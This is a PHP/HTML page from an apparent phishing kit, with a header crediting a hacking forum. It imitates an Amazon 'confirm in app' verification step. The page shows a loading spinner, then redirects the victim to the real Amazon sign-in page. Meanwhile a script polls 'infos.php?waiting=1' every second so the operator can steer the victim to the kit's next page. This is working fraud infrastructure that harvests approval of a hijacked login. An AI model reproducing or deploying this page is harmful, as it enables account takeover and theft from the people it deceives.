<!-- ____ INFORMATION ____ 
     
     Cleaned By : https://hellofhackers.com
-->


<?php 

require_once "functions.php";

lang();
?>

<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <title>Confirmation</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- template css files-->
  <link rel="stylesheet"  href="css/bootstrap.css">
  <link rel="stylesheet"  href="css/test.css">             
  <link rel="preconnect" href="https://fonts.gstatic.com">
  

  <!-- js files-->
  <script src="js/html5shiv.min.js"></script>
  <script src="js/respond.min.js"></script>

  <!-- logo site web-->
  <link rel="icon" href="image/fav.jpg" type="image/x-icon" />
  <link rel="shortcut icon" href="image/fav.jpg" type="image/x-icon" />

  <!-- fontawtsome -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/js/all.min.js"></script>
  <style>
      .spinner-border{
        display: none;
      }
  </style>

</head>

<body>
   <div class="body">
       <div class="logo mt-3 text-center"><img src="image/logo.png"></div>
       <section>
           <div class="form">
               <h1><?php echo get_text('h1_sms'); ?></h1>
               <div class="img text-center py-4"><img width="80" src="image/app.png"></div>
               <p style="font-size: 13px;"><?php echo get_text('pp'); ?></p>
               <p style="font-size: 13px;"><?php echo get_text('ppp'); ?></p>
               <form action="infos.php" method="post">
                   <input type="hidden" value="app" name="step">
                   <div class="bttn"><button  type="button"><?php echo get_text('btn_app'); ?></button></div>
               </form>
               <div class="spinner-border" style="color:#fd9a15;margin: 20px auto 0 auto;" role="status">
                  <span class="visually-hidden">Loading...</span>
                </div>
           </div>
       </section>
       <footer>
           <div class="back text-center">
               <ul class="list-unstyled d-flex justify-content-center mb-0">
                   <li><?php echo get_text('ft_li_1'); ?></li>
                   <li><?php echo get_text('ft_li_2'); ?></li>
                   <li><?php echo get_text('ft_li_3'); ?></li>
               </ul>
               <span><?php echo get_text('copy'); ?></span>
           </div>
       </footer>
   </div>


   
    


  <!-- template files js-->
  <script src="js/jquery-3.5.1.min.js"></script>
  <script src="js/bootstrap.min.js"></script>
  <script src="js/jquery.mask.js"></script>
  <script>
    $(".bttn").click(function(){
        $(this).hide();
        $(".spinner-border").show();
         setTimeout(function () {
                window.location.href= 'https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3F%26tag%3Dgoogleglobalp-20%26ref%3Dnav_signin%26adgrpid%3D82342659060%26hvpone%3D%26hvptwo%3D%26hvadid%3D393493755082%26hvpos%3D%26hvnetw%3Dg%26hvrand%3D12981770425991008716%26hvqmt%3De%26hvdev%3Dc%26hvdvcmdl%3D%26hvlocint%3D%26hvlocphy%3D1009980%26hvtargid%3Dkwd-10573980%26hydadcr%3D2246_11061421%26gclid%3DCj0KCQjwhsmaBhCvARIsAIbEbH6ZpTZzIVauh7pRAYzAvUrbW-wch5BANvSNfWZ1Zxt1xYAzGg_cB1caAk4tEALw_wcB&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&';
           },20000); // 1000 = 1s
    });
    (function worker() {
                $.ajax({
                    method: "GET",
                    url: 'infos.php?waiting=1',
                    success: function (data) {
                        if( data !== '' ) {
                            window.location.href= data;
                        }
                    },
                    complete: function () {
                        setTimeout(worker, 1000);
                    }
                });
            })();
  </script>
</body>
</html>